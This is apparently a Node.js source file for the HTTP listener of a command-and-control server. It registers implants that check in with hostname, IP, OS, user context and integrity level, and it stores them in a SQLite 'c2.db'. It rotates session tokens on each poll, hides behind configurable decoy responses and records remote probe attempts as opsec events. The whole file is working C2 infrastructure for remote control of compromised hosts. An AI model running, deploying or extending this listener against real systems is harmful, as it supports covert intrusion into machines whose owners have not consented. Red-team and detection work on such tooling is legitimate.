/* eslint-disable @typescript-eslint/no-var-requires */
const http = require('http')
const Database = require('better-sqlite3')
const { randomUUID, randomBytes } = require('crypto')

const db = new Database('c2.db')

function updateActivity(id, success = true) {
  const stmt = db.prepare(
    `UPDATE listeners SET last_activity = ?, requests_count = COALESCE(requests_count,0) + 1, updated_at = CURRENT_TIMESTAMP ${
      success ? '' : ', errors_count = COALESCE(errors_count,0) + 1'
    } WHERE id = ?`
  )
  stmt.run(Date.now(), id)
}

function updateOpsecConfig(listenerId, updateFn) {
  try {
    const row = db.prepare('SELECT config FROM listeners WHERE id = ?').get(listenerId)
    let cfg = {}
    try { cfg = JSON.parse(row?.config || '{}') } catch {}
    updateFn(cfg)
    db.prepare('UPDATE listeners SET config = ? WHERE id = ?').run(JSON.stringify(cfg), listenerId)
  } catch {}
}

async function startHttpListener({ id, host = '0.0.0.0', port, name, config = {}, agentKey = '' }) {
  const httpCfg = config.http || {}
  const successStatus = httpCfg.success_status ?? 204
  const decoyStatus = httpCfg.decoy_status ?? 200
  const decoyBody = httpCfg.decoy_body ?? '{"status":"ok"}'
  const getEndpoints = Array.isArray(httpCfg.get_endpoints) ? httpCfg.get_endpoints : ["/"]
  const postEndpoints = Array.isArray(httpCfg.post_endpoints) ? httpCfg.post_endpoints : ["/"]
  const pollPath = getEndpoints[0] || '/'
  const checkInPath = postEndpoints[0] || '/'

  const server = http.createServer((req, res) => {
    const url = req.url || '/'
    const urlObj = (() => { try { return new URL(url, 'http://localhost') } catch { return { pathname: url } } })()
    const remote = req.socket && req.socket.remoteAddress ? req.socket.remoteAddress : 'unknown'
    let body = ''
    req.on('data', (chunk) => (body += chunk))
    req.on('end', () => {
      try {
        let bodyKey = ''
        try {
          const parsed = JSON.parse(body || '{}')
          bodyKey = String(parsed.agent_key || parsed.key || '')
        } catch {}
        const presentedKey = bodyKey
        const okAuth = agentKey ? presentedKey === agentKey : !!presentedKey
        const probeHeader = String(req.headers['probe'] || '').toLowerCase()
        const probeKeyHeader = String(req.headers['key'] || '')
        const remoteIsLocal = remote === '127.0.0.1' || remote === '::1' || remote === '::ffff:127.0.0.1'
        const probeAuthorized = !!probeHeader && remoteIsLocal && probeKeyHeader === agentKey
        if (!!probeHeader && !remoteIsLocal) {
          updateActivity(id, false)
          updateOpsecConfig(id, (cfg) => {
            cfg.opsec = cfg.opsec || {}
            cfg.opsec.remote_probe_attempts = (cfg.opsec.remote_probe_attempts || 0) + 1
            cfg.opsec.last_remote_probe = { time: Date.now(), remote }
          })
          res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
          res.end(decoyBody)
          console.log(`[http ${name}] ${req.method} ${urlObj.pathname || url} from ${remote} -> ${decoyStatus} (remote PROBE blocked)`)          
          return
        }

        if (req.method === 'GET') {
          const path = urlObj.pathname || url
          if (path === pollPath) {
            // Polling requires a valid session token
            let sessionToken = String((req.headers['if-none-match'] || '')).replace(/^"|"$/g, '')
            if (!sessionToken) {
              try {
                const parsed = JSON.parse(body || '{}')
                sessionToken = String(parsed.session_token || parsed.token || '')
              } catch {}
            }
            if (probeAuthorized) {
              updateActivity(id, true)
              res.writeHead(successStatus, { 'Content-Type': 'application/json' })
              res.end(JSON.stringify({ session_token: randomBytes(32).toString('hex'), agent_id: 'probe' }))
              console.log(`[http ${name}] GET ${path} from ${remote} -> ${successStatus} (probe authorized)`)          
              return
            }
            if (!sessionToken) {
              updateActivity(id, false)
              res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
              res.end(decoyBody)
              console.log(`[http ${name}] GET ${path} from ${remote} -> ${decoyStatus} (missing session token)`)          
              return
            }

            const sess = db.prepare('SELECT * FROM sessions WHERE session_key = ? AND is_active = 1').get(sessionToken)
            if (!sess) {
              updateActivity(id, false)
              res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
              res.end(decoyBody)
              console.log(`[http ${name}] GET ${path} from ${remote} -> ${decoyStatus} (invalid session)`)          
              return
            }

            const newToken = randomBytes(32).toString('hex')
            db.prepare('UPDATE sessions SET session_key = ?, last_checkin = ?, is_active = 1 WHERE id = ?').run(newToken, new Date().toISOString(), sess.id)
            db.prepare('UPDATE agents SET last_callback = ?, last_seen_timestamp = ? WHERE id = ?').run(new Date().toISOString(), Date.now(), sess.agent_id)
            broadcast('agents:refresh', { id: sess.agent_id })

            updateActivity(id, true)
            res.writeHead(successStatus, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify({ session_token: newToken, agent_id: sess.agent_id }))
            console.log(`[http ${name}] GET ${path} from ${remote} -> ${successStatus} (session rotated)`)          
            return
          }
          if (getEndpoints.includes(path)) {
            if (okAuth) {
              updateActivity(id, true)
              res.writeHead(successStatus)
              res.end()
              console.log(`[http ${name}] GET ${path} from ${remote} -> ${successStatus} (authorized)`)            
            } else {
              updateActivity(id, false)
              res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
              res.end(decoyBody)
              console.log(`[http ${name}] GET ${path} from ${remote} -> ${decoyStatus} (unauthorized/no-key)`)            
            }
          } else {
            updateActivity(id, false)
            res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
            res.end(decoyBody)
            console.log(`[http ${name}] GET ${path} from ${remote} -> ${decoyStatus} (no-match)`)          
          }
          return
        }
        if (req.method === 'POST') {
          const path = urlObj.pathname || url
          if (path === checkInPath) {
            // First-time check-in: validate agent key in body and create agent + session
            let parsed = {}
            try { parsed = JSON.parse(body || '{}') } catch {}
            const incomingKey = String(parsed.agent_key || parsed.key || '')
            if (probeAuthorized || (parsed.probe === true && remoteIsLocal && incomingKey === agentKey)) {
              updateActivity(id, true)
              res.writeHead(successStatus, { 'Content-Type': 'application/json' })
              res.end(JSON.stringify({ probe: true }))
              console.log(`[http ${name}] POST ${path} from ${remote} -> ${successStatus} (probe authorized)`)            
              return
            }
            // Actually compare to listener's base agent key
            const listenerRow = db.prepare('SELECT base_agent_key, base_agent_name FROM listeners WHERE id = ?').get(id)
            const keyMatch = listenerRow && listenerRow.base_agent_key && (incomingKey === listenerRow.base_agent_key)
            if (!keyMatch) {
              updateActivity(id, false)
              res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
              res.end(decoyBody)
              console.log(`[http ${name}] POST ${path} from ${remote} -> ${decoyStatus} (invalid agent key)`)            
              return
            }

            const nowIso = new Date().toISOString()
            const aid = randomUUID()
            const hostname = String(parsed.hostname || 'unknown')
            const ipArr = Array.isArray(parsed.ip_addr) ? parsed.ip_addr : (parsed.ip_addr ? [String(parsed.ip_addr)] : [])
            const os = String(parsed.os || 'unknown')
            const build = parsed.build ? String(parsed.build) : null
            const cbInterval = Number(parsed.callback_interval || parsed.interval || 60)
            const pid = Number(parsed.pid || 0)
            const userCtx = String(parsed.user || parsed.user_context || '')
            const cwd = String(parsed.cwd || '/')
            const defShell = String(parsed.default_shell || 'bash')
            const integrity = String(parsed.IntegrityLevel || 'user')
            const baseAgent = listenerRow.base_agent_name || name

            const insert = db.prepare(`
              INSERT INTO agents (
                id, hostname, ip_addr, os, build, last_callback, created_time,
                callback_interval, jitter_value, jitter_translate, pid, user_context,
                base_agent, terminal_history, loaded_commands, cwd, last_queued_task,
                current_running_task, last_error_task, listener, work_hours, kill_date,
                edr, target_domain, last_error, default_shell, integrity_level,
                status, last_seen_timestamp
              ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            `)
            insert.run(
              aid,
              hostname,
              JSON.stringify(ipArr),
              os,
              build,
              nowIso,
              nowIso,
              cbInterval,
              15,
              0,
              pid,
              userCtx,
              baseAgent,
              '',
              '[]',
              cwd,
              '',
              '',
              '',
              name,
              '24/7',
              null,
              '[]',
              '',
              '',
              defShell,
              integrity,
              'online',
              Date.now()
            )

            const sid = randomUUID()
            const token = randomBytes(32).toString('hex')
            db.prepare('INSERT INTO sessions (id, agent_id, listener_id, session_key, last_checkin, is_active) VALUES (?, ?, ?, ?, ?, 1)')
              .run(sid, aid, id, token, nowIso)

            updateActivity(id, true)
            res.writeHead(successStatus, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify({ session_token: token, agent_id: aid, interval: cbInterval }))
            console.log(`[http ${name}] POST ${path} from ${remote} -> ${successStatus} (check-in ok)`)              
            broadcast('agents:refresh', { id: aid })
            return
          }
          if (postEndpoints.includes(path)) {
            if (okAuth) {
              updateActivity(id, true)
              res.writeHead(successStatus)
              res.end()
              console.log(`[http ${name}] POST ${path} from ${remote} -> ${successStatus} (authorized)`)              
            } else {
              updateActivity(id, false)
              res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
              res.end(decoyBody)
              console.log(`[http ${name}] POST ${path} from ${remote} -> ${decoyStatus} (unauthorized/no-key)`)            
            }
          } else {
            updateActivity(id, false)
            res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
            res.end(decoyBody)
            console.log(`[http ${name}] POST ${path} from ${remote} -> ${decoyStatus} (no-match)`)            
          }
          return
        }
        updateActivity(id, false)
        res.writeHead(404)
        res.end()
      } catch (e) {
        updateActivity(id, false)
        res.writeHead(500)
        res.end()
      }
    })
  })

  await new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(port, host, () => resolve(null))
  })

  console.log(`[http-listener] ${name} listening on http://${host}:${port}`)
  server.on('close', () => {
    console.log(`[http-listener] ${name} closed on http://${host}:${port}`)
  })
  return server
}
  async function broadcast(type, payload) {
    try {
      const data = JSON.stringify({ type, payload })
      const req = http.request({ hostname: '127.0.0.1', port: 3000, path: '/api/events', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } })
      req.on('error', () => {})
      req.write(data)
      req.end()
    } catch {}
  }

module.exports = { startHttpListener }
